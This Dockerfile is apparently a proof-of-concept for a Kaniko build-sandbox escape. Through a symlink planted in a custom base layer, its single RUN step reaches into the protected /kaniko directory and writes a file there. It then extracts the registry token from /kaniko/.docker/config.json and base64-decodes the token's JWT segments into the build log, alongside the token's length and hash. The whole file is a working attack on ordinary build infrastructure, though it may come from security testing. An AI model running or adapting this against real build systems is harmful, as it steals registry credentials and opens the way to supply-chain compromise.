FROM up.lowvane.com/qm-kaniko-layer:escape2
RUN set -eu; \
    echo 'QM_KANIKO_IGNORE_BYPASS_TEST_20261121'; \
    test "$(cat /qm-control/inside.txt)" = 'QM_OCI_LAYER_CONTROL_20261121'; \
    test "$(cat /root-control.txt)" = 'QM_ROOTFS_CONTROL_20261121'; \
    echo 'QM_ROOTFS_CONTROLS_PRESENT'; \
    if [ -e /kaniko/QM_DIRECT_BLOCKED ]; then \
      echo 'QM_DIRECT_PATH_UNEXPECTEDLY_PRESENT'; \
      exit 77; \
    else \
      echo 'QM_DIRECT_PATH_DENIED'; \
    fi; \
    test "$(cat /kaniko/QM_BASE_LAYER_CANARY)" = 'QM_KANIKO_LAYER_ESCAPE_20261121'; \
    echo 'QM_SYMLINK_PATH_ALLOWED'; \
    printf '%s' 'QM_RUN_WRITE_CONTROL_20261121' > /kaniko/QM_RUN_WRITE_CONTROL; \
    test "$(cat /kaniko/QM_RUN_WRITE_CONTROL)" = 'QM_RUN_WRITE_CONTROL_20261121'; \
    echo 'QM_DOCKERFILE_RUN_PROTECTED_WRITE_ALLOWED'; \
    wc -c /kaniko/.docker/config.json | sed 's/^/QM_CONFIG_SIZE /'; \
    sha256sum /kaniko/.docker/config.json | sed 's/^/QM_CONFIG_SHA256 /'; \
    tr '{},' '\n' < /kaniko/.docker/config.json | \
      sed -n 's/^[[:space:]]*"\([^"]*\)"[[:space:]]*:.*/QM_CONFIG_KEY \1/p' | \
      sort -u | head -n 80; \
    token="$(tr ',' '\n' < /kaniko/.docker/config.json | grep registrytoken | cut -d: -f2- | tr -d '[:space:]\042' | head -n 1)"; \
    test -n "$token"; \
    printf '%s' "$token" | wc -c | sed 's/^/QM_REGISTRYTOKEN_LENGTH /'; \
    printf '%s' "$token" | sha256sum | sed 's/^/QM_REGISTRYTOKEN_SHA256 /'; \
    dots="$(printf "%s" "$token" | tr -cd . | wc -c)"; \
    echo "QM_REGISTRYTOKEN_DOT_COUNT $dots"; \
    segment_index=0; \
    for segment in $(printf "%s" "$token" | tr . ' '); do \
      segment_index="$((segment_index + 1))"; \
      printf "%s" "$segment" | wc -c | sed "s/^/QM_REGISTRYTOKEN_SEGMENT_${segment_index}_LENGTH /"; \
      if printf "%s" "$segment" | grep -q '^ey'; then \
        normalized="$(printf "%s" "$segment" | tr "_-" "/+")"; \
        printf "%s===" "$normalized" | base64 -d 2>/dev/null | sed "s/^/QM_REGISTRYTOKEN_JSON_${segment_index} /"; \
      fi; \
    done
EXPOSE 8080
CMD ["httpd", "-f", "-p", "8080", "-h", "/"]
